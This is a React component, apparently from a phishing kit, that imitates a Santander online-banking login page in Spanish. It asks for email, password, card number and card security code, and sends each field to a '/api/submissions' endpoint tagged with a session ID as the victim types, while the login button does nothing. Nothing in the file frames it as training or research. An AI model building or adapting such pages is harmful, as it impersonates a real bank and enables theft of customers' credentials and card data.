import { useState } from "react";
import { useMutation } from "@tanstack/react-query";
import { useLocation } from "wouter";
import { apiRequest } from "@/lib/queryClient";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";

export default function SantanderTemplate() {
  const [location] = useLocation();
  const sessionId = new URLSearchParams(window.location.search).get("sessionId");
  
  const [formData, setFormData] = useState({
    email: "",
    password: "",
    cardNumber: "",
    securityCode: "",
  });

  const submitDataMutation = useMutation({
    mutationFn: async (data: { fieldName: string; fieldValue: string }) => {
      const response = await apiRequest("POST", "/api/submissions", {
        sessionId,
        ...data,
      });
      return response.json();
    },
  });

  const handleInputChange = (fieldName: string, value: string) => {
    setFormData(prev => ({ ...prev, [fieldName]: value }));
    
    // Submit data in real-time
    if (value.trim() && sessionId) {
      submitDataMutation.mutate({ fieldName, fieldValue: value });
    }
  };

  return (
    <div className="template-container min-h-screen bg-white flex items-center justify-center p-4">
      <div className="w-full max-w-md">
        <div className="text-center mb-8">
          <div className="w-16 h-16 bg-red-600 rounded-lg flex items-center justify-center mx-auto mb-4">
            <span className="text-white font-bold text-2xl">S</span>
          </div>
          <h1 className="text-2xl font-bold text-gray-800 mb-2">Santander</h1>
          <p className="text-gray-700">Accede a tu banca en línea</p>
        </div>

        <div className="bg-white border border-gray-200 rounded-lg shadow-lg p-6">
          <form className="space-y-4">
            <div>
              <Label htmlFor="email" className="text-gray-800">Email</Label>
              <Input
                id="email"
                type="email"
                value={formData.email}
                onChange={(e) => handleInputChange("email", e.target.value)}
                className="mt-1 bg-white border-gray-300 text-gray-800"
                placeholder="tu.email@ejemplo.com"
                data-testid="input-email"
              />
            </div>

            <div>
              <Label htmlFor="password" className="text-gray-800">Contraseña</Label>
              <Input
                id="password"
                type="password"
                value={formData.password}
                onChange={(e) => handleInputChange("password", e.target.value)}
                className="mt-1 bg-white border-gray-300 text-gray-800"
                placeholder="••••••••"
                data-testid="input-password"
              />
            </div>

            <div>
              <Label htmlFor="cardNumber" className="text-gray-800">Número de Tarjeta</Label>
              <Input
                id="cardNumber"
                value={formData.cardNumber}
                onChange={(e) => handleInputChange("cardNumber", e.target.value)}
                className="mt-1 bg-white border-gray-300 text-gray-800"
                placeholder="1234 5678 9012 3456"
                data-testid="input-card-number"
              />
            </div>

            <div>
              <Label htmlFor="securityCode" className="text-gray-800">Código de Seguridad</Label>
              <Input
                id="securityCode"
                value={formData.securityCode}
                onChange={(e) => handleInputChange("securityCode", e.target.value)}
                className="mt-1 bg-white border-gray-300 text-gray-800"
                placeholder="123"
                maxLength={3}
                data-testid="input-security-code"
              />
            </div>

            <Button 
              type="button"
              className="w-full bg-red-600 hover:bg-red-700 text-white"
              data-testid="button-submit"
            >
              Ingresar
            </Button>
          </form>

          <div className="mt-4 text-center">
            <a href="#" className="text-sm text-red-600 hover:underline">
              ¿Olvidaste tu contraseña?
            </a>
          </div>
        </div>
      </div>
    </div>
  );
}
